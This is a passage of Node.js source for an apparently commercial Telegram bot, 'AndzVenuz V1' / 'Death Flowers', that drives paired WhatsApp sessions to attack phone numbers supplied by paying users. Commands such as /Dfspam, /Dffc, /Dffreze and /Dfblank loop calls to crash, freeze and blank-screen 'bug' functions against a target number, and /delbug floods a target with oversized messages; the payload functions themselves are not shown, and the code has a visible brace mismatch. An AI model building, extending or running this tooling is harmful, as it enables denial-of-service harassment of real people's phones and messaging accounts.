<blockquote>【 TOOLS MENU 2 】</blockquote>
〣 /sticker » reply photo/url
〣 /mute » mute users
〣 /unmute » unmute users
〣 /time » real time
〣 /ban » ban users
〣 /unban » unban users
〣 /kick » kick users 
〣 /negarainfo » Negara Info
〣 /gempa » cek gempa bumi
〣 /ceklokasi » cek lokasi users
〣 /dunia » world news
〣 /ssweb » ss website 
`;

    newButtons = [
      [{ text: "⬅️BACK", callback_data: "mainmenu", style : "success" }],
      [{ text: "NEXT➡️", callback_data: "bugshow", style : "danger" }]
    ];
  } else if (data === "mainmenu") {
    const runtime = getBotRuntime();
    const isPremium = premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date());
    newCaption =
`<blockquote>『 ᴀɴᴅᴢᴠᴇɴᴜᴢ ᴠ1  』</blockquote>
𝐖𝐄𝐋𝐋𝐂𝐎𝐌𝐄 𝐒𝐂 𝐀𝐍𝐃𝐙𝐕𝐄𝐍𝐔𝐙 𝐕𝟏 
𝐆𝐔𝐍𝐀𝐊𝐀𝐍 𝐋𝐀𝐇 𝐁𝐔𝐆 𝐃𝐄𝐍𝐆𝐀𝐍 𝐁𝐈𝐉𝐀𝐊 ✅
<blockquote>『 ᴀɴᴅᴢᴠᴇɴᴜᴢ ᴠ1 』</blockquote>
✧ 𝐝𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 : @ɪsᴇʟᴄᴜɴɢᴢ
✧ 𝐯𝐞𝐫𝐬𝐢𝐨𝐧 : 𝟏.𝟎 𝐯𝐢𝐩 𝐨𝐧𝐥𝐲 
✧ 𝐦𝐲 𝐩𝐫𝐢𝐧𝐜𝐞𝐬 : 𝐀****
`;
    newButtons = [
  [
    { text: "SPICLES⚠️", callback_data: "nanzhama", style : "success" }
  ],
  [
    { text: "TOOLS V2💞", callback_data: "tools2menu", style : "success" }
   ],
   [
    { text: "SUPPORT💞", callback_data: "suppmenu", style : "success" },
    { text: "OWNER IN MENU💞", callback_data: "ownermenu", style : "danger" }
  ],
  [
    { text: "TOOLS💞", callback_data: "toolsmenu", style : "danger" },
    { text: "ATTACK💞", callback_data: "bugshow", style : "danger" }
  ],
  [
    { text: "MY CREATOR💞", url: "https://t.me/nanzlyora", style : "primary" },
    { text: "MY INFOTMATION💞", url: "https://t.me/deathflowersnew", style : "primary" }
  ]
  ];
  }

  try {
    await bot.editMessageMedia({
      type: "photo",
      media: randomImage,
      caption: newCaption,
      parse_mode: "HTML"
    }, {
      chat_id: chatId,
      message_id: messageId,
      reply_markup: {
        inline_keyboard: newButtons
      }
    });
  } catch (err) {
    if (err.response?.body?.description?.includes("message is not modified")) {
      return bot.answerCallbackQuery(callbackQuery.id, { text: "Sudah di menu ini.", show_alert: false });
    } else {
      console.error("Gagal edit media:", err);
    }
  }

  bot.answerCallbackQuery(callbackQuery.id);
});

// ======= ( Parameter ) ======= \\
const sleep = (ms) => new Promise(res => setTimeout(res, ms));
const slowDelay = () => sleep(Math.floor(Math.random() * 500) + 500);
// ======= ( Pemanggilan ) ======= \\
async function delayspam(target) {
    for (let i = 0; i < 1; i++) {
    await delaySpam(sock, target);
    await spamhard(sock, target);
    await sleep(10);
    console.log(chalk.yellow(`Death Flowers Attacked Your Devices 🤍 Sending Bug To ${target} suksesfull`));
    }
    }
async function invis(target) {
    for (let i = 0; i < 20; i++) {
    await delaySpam(sock, target);
    await sleep(30);
    console.log(chalk.yellow(`Death Flowers Attacked Your Devices 🤍 Sending Bug To ${target} suksesfull`));
    }
    }
async function fc(target) {
    for (let i = 0; i < 20; i++) {
    await JawaTimurForcloseClick(target);
    console.log(chalk.yellow(`Death Flowers Attacked Your Devices 🤍 Sending Bug To ${target} suksesfull`));
    }
async function frezebos(target) {
    for (let i = 0; i < 20; i++) {
    await FreezeChatByMia(sock, target);
    await sleep(30);
    console.log(chalk.yellow(`Death Flowers Attacked Your Devices 🤍 Sending Bug To ${target} suksesfull`));
    }
    }
    }
async function hardbos(target) {
    for (let i = 0; i < 20; i++) {
    await spamhard(sock, target);
    await sleep(30);
    console.log(chalk.yellow(`Death Flowers Attacked Your Devices 🤍 Sending Bug To ${target} suksesfull`));
    }
    }
async function blanknanz(target) {
    for (let i = 0; i < 20; i++) {
    await BlankUi(sock, target);
    await sleep(30);
    console.log(chalk.yellow(`Death Flowers Attacked Your Devices 🤍 Sending Bug To ${target} suksesfull`));
    }
    }
//// =====( CASE BUG 1 ) ===== \\\\
bot.onText(/\/Dfspam (\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat?.type;
    const date = getCurrentDate();
    const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
    const targetNumber = match[1];
    const randomImage = getRandomImage();
            const cooldown = checkCooldown(userId);
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const jid = `${formattedNumber}@s.whatsapp.net`;

    if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
        return bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
<blockquote>『 ᴀɴᴅᴢᴠᴇɴᴜᴢ ᴠ1  』</blockquote>
「 ⓘ Fitur Ini Khusus Premium Bg 」
`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "DEVELOPER", url: "https://t.me/Fadlanriko" }]
                ]
            }
        });
    }

    if (checkCooldown(userId) > 0) {
        return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
    }

    if (sessions.size === 0) {
        return bot.sendMessage(chatId, `
╭⧽『 𝐄𝐑𝐑𝐎𝐑 』
│〣 Belum Terhubung, Bung.
│〣 Sistem menolak akses lu.
╰──────────────────╯

╭⧽『 𝐂𝐀𝐓𝐀𝐓𝐀𝐍 』
│〣 Gunakan perintah /reqpair
│〣 Untuk mengaktifkan mode bug.
╰──────────────────╯.`);
    }
    
    if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }
    

    const sent = await bot.sendPhoto(chatId, "https://files.catbox.moe/yi1upc.jpg", {
        caption: `
『 𝗦 𝗘 𝗡 𝗗 𝗜 𝗡 𝗚 𝗕 𝗨 𝗚 』
〣 Target : ${formattedNumber}
〣 Mode : FC Spam
〣 Status : Procces
〣 Date : ${date}
`,
        parse_mode: "HTML"
    });

    try {
        
        await new Promise(r => setTimeout(r, 1000));
        await bot.editMessageCaption(`
『 𝗦 𝗘 𝗡 𝗗 𝗜 𝗡 𝗚 𝗕 𝗨 𝗚 』
〣 Target : ${formattedNumber}
〣 Mode : Invis X Hard Spam
〣 Status : Procces
〣 Date : ${date}
`,
          
           {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "TARGET", url: `https://wa.me/${formattedNumber}` }],
        ],
      },
    }
  );

        console.log("\x1b[31m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

         await delayspam(jid);
       
        console.log("\x1b[31m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

        await bot.editMessageCaption(`
『 𝗦 𝗘 𝗡 𝗗 𝗜 𝗡 𝗚 𝗕 𝗨 𝗚 』
〣 Target : ${formattedNumber}
〣 Mode : Invis X Hard Spam
〣 Status : Success
〣 Date : ${date}
`, 

          {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "TARGET", url: `https://wa.me/${formattedNumber}` }]
                ]
            }
        });

    } catch (err) {
        await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
    }
});
bot.onText(/\/Dfinvis (\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat?.type;
    const date = getCurrentDate();
    const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
    const targetNumber = match[1];
    const randomImage = getRandomImage();
            const cooldown = checkCooldown(userId);
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const jid = `${formattedNumber}@s.whatsapp.net`;

    if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
        return bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
<blockquote>『 ᴀɴᴅᴢᴠᴇɴᴜᴢ ᴠ1  』</blockquote>
「 ⓘ Fitur Ini Khusus Premium Bg 」
`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "DEVELOPER", url: "https://t.me/Fadlanriko" }]
                ]
            }
        });
    }

    if (checkCooldown(userId) > 0) {
        return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
    }

    if (sessions.size === 0) {
        return bot.sendMessage(chatId, `
╭⧽『 𝐄𝐑𝐑𝐎𝐑 』
│〣 Belum Terhubung, Bung.
│〣 Sistem menolak akses lu.
╰──────────────────╯

╭⧽『 𝐂𝐀𝐓𝐀𝐓𝐀𝐍 』
│〣 Gunakan perintah /reqpair
│〣 Untuk mengaktifkan mode bug.
╰──────────────────╯.`);
    }
    
    if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }
    

    const sent = await bot.sendPhoto(chatId, "https://files.catbox.moe/yi1upc.jpg", {
        caption: `
『 𝗦 𝗘 𝗡 𝗗 𝗜 𝗡 𝗚 𝗕 𝗨 𝗚 』
〣 Target : ${formattedNumber}
〣 Mode : Invis Spam
〣 Status : Procces
〣 Date : ${date}
`,
        parse_mode: "HTML"
    });

    try {
        
        await new Promise(r => setTimeout(r, 1000));
        await bot.editMessageCaption(`
『 𝗦 𝗘 𝗡 𝗗 𝗜 𝗡 𝗚 𝗕 𝗨 𝗚 』
〣 Target : ${formattedNumber}
〣 Mode : Invis Spam
〣 Status : Procces
〣 Date : ${date}
`,
          
           {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "TARGET", url: `https://wa.me/${formattedNumber}` }],
        ],
      },
    }
  );

        console.log("\x1b[31m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

         await invis(jid);
       
        console.log("\x1b[31m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

        await bot.editMessageCaption(`
『 𝗦 𝗘 𝗡 𝗗 𝗜 𝗡 𝗚 𝗕 𝗨 𝗚 』
〣 Target : ${formattedNumber}
〣 Mode : Invis Spam
〣 Status : Success
〣 Date : ${date}
`, 

          {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "TARGET", url: `https://wa.me/${formattedNumber}` }]
                ]
            }
        });

    } catch (err) {
        await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
    }
});
bot.onText(/\/Dffc (\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat?.type;
    const date = getCurrentDate();
    const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
    const targetNumber = match[1];
    const randomImage = getRandomImage();
            const cooldown = checkCooldown(userId);
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const jid = `${formattedNumber}@s.whatsapp.net`;

    if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
        return bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
<blockquote>『 ᴀɴᴅᴢᴠᴇɴᴜᴢ ᴠ1  』</blockquote>
「 ⓘ Fitur Ini Khusus Premium Bg 」
`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "DEVELOPER", url: "https://t.me/Fadlanriko" }]
                ]
            }
        });
    }

    if (checkCooldown(userId) > 0) {
        return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
    }

    if (sessions.size === 0) {
        return bot.sendMessage(chatId, `
╭⧽『 𝐄𝐑𝐑𝐎𝐑 』
│〣 Belum Terhubung, Bung.
│〣 Sistem menolak akses lu.
╰──────────────────╯

╭⧽『 𝐂𝐀𝐓𝐀𝐓𝐀𝐍 』
│〣 Gunakan perintah /reqpair
│〣 Untuk mengaktifkan mode bug.
╰──────────────────╯.`);
    }
    
    if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }
    

    const sent = await bot.sendPhoto(chatId, "https://files.catbox.moe/yi1upc.jpg", {
        caption: `
『 𝗦 𝗘 𝗡 𝗗 𝗜 𝗡 𝗚 𝗕 𝗨 𝗚 』
〣 Target : ${formattedNumber}
〣 Mode : FC Spam
〣 Status : Procces
〣 Date : ${date}
`,
        parse_mode: "HTML"
    });

    try {
        
        await new Promise(r => setTimeout(r, 1000));
        await bot.editMessageCaption(`
『 𝗦 𝗘 𝗡 𝗗 𝗜 𝗡 𝗚 𝗕 𝗨 𝗚 』
〣 Target : ${formattedNumber}
〣 Mode : FC Spam
〣 Status : Procces
〣 Date : ${date}
`,
          
           {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "TARGET", url: `https://wa.me/${formattedNumber}` }],
        ],
      },
    }
  );

        console.log("\x1b[31m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

         await fc(jid);
       
        console.log("\x1b[31m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

        await bot.editMessageCaption(`
『 𝗦 𝗘 𝗡 𝗗 𝗜 𝗡 𝗚 𝗕 𝗨 𝗚 』
〣 Target : ${formattedNumber}
〣 Mode : FC Spam
〣 Status : Success
〣 Date : ${date}
`, 

          {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "TARGET", url: `https://wa.me/${formattedNumber}` }]
                ]
            }
        });

    } catch (err) {
        await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
    }
});
bot.onText(/\/Dffreze (\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat?.type;
    const date = getCurrentDate();
    const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
    const targetNumber = match[1];
    const randomImage = getRandomImage();
            const cooldown = checkCooldown(userId);
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const jid = `${formattedNumber}@s.whatsapp.net`;

    if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
        return bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
<blockquote>『 ᴀɴᴅᴢᴠᴇɴᴜᴢ ᴠ1  』</blockquote>
「 ⓘ Fitur Ini Khusus Premium Bg 」
`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "DEVELOPER", url: "https://t.me/Fadlanriko" }]
                ]
            }
        });
    }

    if (checkCooldown(userId) > 0) {
        return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
    }

    if (sessions.size === 0) {
        return bot.sendMessage(chatId, `
╭⧽『 𝐄𝐑𝐑𝐎𝐑 』
│〣 Belum Terhubung, Bung.
│〣 Sistem menolak akses lu.
╰──────────────────╯

╭⧽『 𝐂𝐀𝐓𝐀𝐓𝐀𝐍 』
│〣 Gunakan perintah /reqpair
│〣 Untuk mengaktifkan mode bug.
╰──────────────────╯.`);
    }
    
    if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }
    

    const sent = await bot.sendPhoto(chatId, "https://files.catbox.moe/yi1upc.jpg", {
        caption: `
『 𝗦 𝗘 𝗡 𝗗 𝗜 𝗡 𝗚 𝗕 𝗨 𝗚 』
〣 Target : ${formattedNumber}
〣 Mode : Freze Spam
〣 Status : Procces
〣 Date : ${date}
`,
        parse_mode: "HTML"
    });

    try {
        
        await new Promise(r => setTimeout(r, 1000));
        await bot.editMessageCaption(`
『 𝗦 𝗘 𝗡 𝗗 𝗜 𝗡 𝗚 𝗕 𝗨 𝗚 』
〣 Target : ${formattedNumber}
〣 Mode : Freze Spam
〣 Status : Procces
〣 Date : ${date}
`,
          
           {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "TARGET", url: `https://wa.me/${formattedNumber}` }],
        ],
      },
    }
  );

        console.log("\x1b[31m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

         await frezebos(jid);
       
        console.log("\x1b[31m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

        await bot.editMessageCaption(`
『 𝗦 𝗘 𝗡 𝗗 𝗜 𝗡 𝗚 𝗕 𝗨 𝗚 』
〣 Target : ${formattedNumber}
〣 Mode : Freze Spam
〣 Status : Success
〣 Date : ${date}
`, 

          {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "TARGET", url: `https://wa.me/${formattedNumber}` }]
                ]
            }
        });

    } catch (err) {
        await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
    }
});
bot.onText(/\/Dfhard (\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat?.type;
    const date = getCurrentDate();
    const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
    const targetNumber = match[1];
    const randomImage = getRandomImage();
            const cooldown = checkCooldown(userId);
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const jid = `${formattedNumber}@s.whatsapp.net`;

    if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
        return bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
<blockquote>『 ᴀɴᴅᴢᴠᴇɴᴜᴢ ᴠ1  』</blockquote>
「 ⓘ Fitur Ini Khusus Premium Bg 」
`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "DEVELOPER", url: "https://t.me/Fadlanriko" }]
                ]
            }
        });
    }

    if (checkCooldown(userId) > 0) {
        return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
    }

    if (sessions.size === 0) {
        return bot.sendMessage(chatId, `
╭⧽『 𝐄𝐑𝐑𝐎𝐑 』
│〣 Belum Terhubung, Bung.
│〣 Sistem menolak akses lu.
╰──────────────────╯

╭⧽『 𝐂𝐀𝐓𝐀𝐓𝐀𝐍 』
│〣 Gunakan perintah /reqpair
│〣 Untuk mengaktifkan mode bug.
╰──────────────────╯.`);
    }
    
    if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }
    

    const sent = await bot.sendPhoto(chatId, "https://files.catbox.moe/yi1upc.jpg", {
        caption: `
『 𝗦 𝗘 𝗡 𝗗 𝗜 𝗡 𝗚 𝗕 𝗨 𝗚 』
〣 Target : ${formattedNumber}
〣 Mode : Hard delay Spam
〣 Status : Procces
〣 Date : ${date}
`,
        parse_mode: "HTML"
    });

    try {
        
        await new Promise(r => setTimeout(r, 1000));
        await bot.editMessageCaption(`
『 𝗦 𝗘 𝗡 𝗗 𝗜 𝗡 𝗚 𝗕 𝗨 𝗚 』
〣 Target : ${formattedNumber}
〣 Mode : Hard delay Spam
〣 Status : Procces
〣 Date : ${date}
`,
          
           {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "TARGET", url: `https://wa.me/${formattedNumber}` }],
        ],
      },
    }
  );

        console.log("\x1b[31m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

         await blanknanz(jid);
       
        console.log("\x1b[31m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

        await bot.editMessageCaption(`
『 𝗦 𝗘 𝗡 𝗗 𝗜 𝗡 𝗚 𝗕 𝗨 𝗚 』
〣 Target : ${formattedNumber}
〣 Mode : Hard delay SPAM
〣 Status : Success
〣 Date : ${date}
`, 

          {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "TARGET", url: `https://wa.me/${formattedNumber}` }]
                ]
            }
        });

    } catch (err) {
        await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
    }
});
bot.onText(/\/Dfblank (\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat?.type;
    const date = getCurrentDate();
    const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
    const targetNumber = match[1];
    const randomImage = getRandomImage();
            const cooldown = checkCooldown(userId);
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const jid = `${formattedNumber}@s.whatsapp.net`;

    if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
        return bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
<blockquote>『 ᴀɴᴅᴢᴠᴇɴᴜᴢ ᴠ1  』</blockquote>
「 ⓘ Fitur Ini Khusus Premium Bg 」
`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "DEVELOPER", url: "https://t.me/Fadlanriko" }]
                ]
            }
        });
    }

    if (checkCooldown(userId) > 0) {
        return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
    }

    if (sessions.size === 0) {
        return bot.sendMessage(chatId, `
╭⧽『 𝐄𝐑𝐑𝐎𝐑 』
│〣 Belum Terhubung, Bung.
│〣 Sistem menolak akses lu.
╰──────────────────╯

╭⧽『 𝐂𝐀𝐓𝐀𝐓𝐀𝐍 』
│〣 Gunakan perintah /reqpair
│〣 Untuk mengaktifkan mode bug.
╰──────────────────╯.`);
    }
    
    if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }
    

    const sent = await bot.sendPhoto(chatId, "https://files.catbox.moe/yi1upc.jpg", {
        caption: `
『 𝗦 𝗘 𝗡 𝗗 𝗜 𝗡 𝗚 𝗕 𝗨 𝗚 』
〣 Target : ${formattedNumber}
〣 Mode : Blank Spam
〣 Status : Procces
〣 Date : ${date}
`,
        parse_mode: "HTML"
    });

    try {
        
        await new Promise(r => setTimeout(r, 1000));
        await bot.editMessageCaption(`
『 𝗦 𝗘 𝗡 𝗗 𝗜 𝗡 𝗚 𝗕 𝗨 𝗚 』
〣 Target : ${formattedNumber}
〣 Mode : Blank Spam
〣 Status : Procces
〣 Date : ${date}
`,
          
           {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "TARGET", url: `https://wa.me/${formattedNumber}` }],
        ],
      },
    }
  );

        console.log("\x1b[31m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

         await ForceInvis(jid);
       
        console.log("\x1b[31m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

        await bot.editMessageCaption(`
『 𝗦 𝗘 𝗡 𝗗 𝗜 𝗡 𝗚 𝗕 𝗨 𝗚 』
〣 Target : ${formattedNumber}
〣 Mode : Blank Spam
〣 Status : Success
〣 Date : ${date}
`, 

          {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "TARGET", url: `https://wa.me/${formattedNumber}` }]
                ]
            }
        });

    } catch (err) {
        await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
    }
});

///======( Plugin ) ======\\\
bot.onText(/\/reqpair (.+)/, async (msg, match) => {
       const chatId = msg.chat.id;
       if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
       return bot.sendMessage(
       chatId,
 `
「 ⓘ Fitur Ini Khusus Owner Bg 」.`,
       { parse_mode: "Markdown" }
       );
       }
       const botNumber = match[1].replace(/[^0-9]/g, "");

       try {
       await connectToWhatsApp(botNumber, chatId);
       } catch (error) {
       console.error("Error in reqpair:", error);
       bot.sendMessage(
       chatId,
       "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
      );
      }
      });

bot.onText(/^\/status$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  // 🧑‍💻 Cek akses admin / owner
  if (!adminUsers.includes(userId) && !isOwner(userId)) {
    return bot.sendMessage(chatId, `
「 ⓘ Fitur Ini Khusus Owner Bg 」
`, { parse_mode: "Markdown" });
  }

  const list = Array.from(sessions.keys());
  const text = list.length
    ? list.map((num, i) => `${i + 1}. ${num}`).join("\n")
    : "❌ Tidak ada sender aktif.";

  await bot.sendMessage(chatId, `
<b>📜 Daftar Sender Aktif:</b>
${text}
`, { parse_mode: "HTML" });
});

bot.onText(/\/delbug\s+(.+)/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;
    const q = match[1]; // Ambil argumen setelah /delete-bug
    
    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendMessage(chatId, 'Lu Gak Punya Access Tolol...');
    }
    
    if (!q) {
        return bot.sendMessage(chatId, `Cara Pakai Nih Njing!!!\n/delbug 62xxx`);
    }
    
    let pepec = q.replace(/[^0-9]/g, "");
    if (pepec.startsWith('0')) {
        return bot.sendMessage(chatId, `Contoh : /delbug 62xxx`);
    }
    
    let target = pepec + '@s.whatsapp.net';
    
    try {
        for (let i = 0; i < 50; i++) {
            await sock.sendMessage(target, { 
                text: "DEATH FLOWERS CLEAR BUG \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nF-SEVEEN CLEAR BUG"
            });
        }
        bot.sendMessage(chatId, "Done Clear Bug By Nanz Lyora!!!");
    } catch (err) {
        console.error("Error:", err);
        bot.sendMessage(chatId, "Ada kesalahan saat mengirim bug.");
    }
});
bot.onText(/^\/delpair\s+(\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const number = match[1];

  // 🧑‍💻 Cek akses admin / owner
  if (!adminUsers.includes(userId) && !isOwner(userId)) {
    return bot.sendMessage(chatId, `
「 ⓘ Fitur Ini Khusus Owner Bg 」
`, { parse_mode: "Markdown" });
  }

  // 🔍 Cek apakah nomor ada di sesi aktif
  if (!sessions.has(number)) {
    return bot.sendMessage(chatId, `
❌ Sender *${number}* tidak ditemukan di sesi aktif.
`, { parse_mode: "Markdown" });
  }

  // 🗑️ Hapus sender dari sesi
  sessions.delete(number);

  // Jika kamu juga menyimpan di file senders.json:
  const fs = require("fs");
  const sendersFile = "./senders.json";
  let senders = [];

  if (fs.existsSync(sendersFile)) {
    senders = JSON.parse(fs.readFileSync(sendersFile, "utf8"));
    senders = senders.filter(s => s !== number);
    fs.writeFileSync(sendersFile, JSON.stringify(senders, null, 2));
  }

  // ✅ Konfirmasi ke user
  return bot.sendMessage(chatId, `
✅ Sender *${number}* berhasil dihapus dari daftar.
`, { parse_mode: "Markdown" });
});
      
bot.onText(/^\/gruponly (on|off)/i, (msg, match) => {
      const chatId = msg.chat.id;
      const senderId = msg.from.id;
      
      if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
      return bot.sendMessage(chatId, `
「 ⓘ Fitur Ini Khusus Owner Bg 」.`);
  }
      const mode = match[1].toLowerCase();
      const status = mode === "on";
      setGroupOnly(status);

      bot.sendMessage(msg.chat.id, `Fitur *Group Only* sekarang: ${status ? "AKTIF" : "NONAKTIF"}`, {
      parse_mode: "Markdown",
      });
      });
bot.onText(/\/done (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const isCreator = msg.from.id === 7824002985; // Ganti dengan ID creator bot Anda

  // Memisahkan parameter teks, harga, dan metode pembayaran
  const args = match[1].split('|'); // Contoh input: /done jasa install panel|50000|Transfer Bank
  const text = args[0]?.trim();
  const harga = args[1]?.trim();
  const payment = args[2]?.trim();

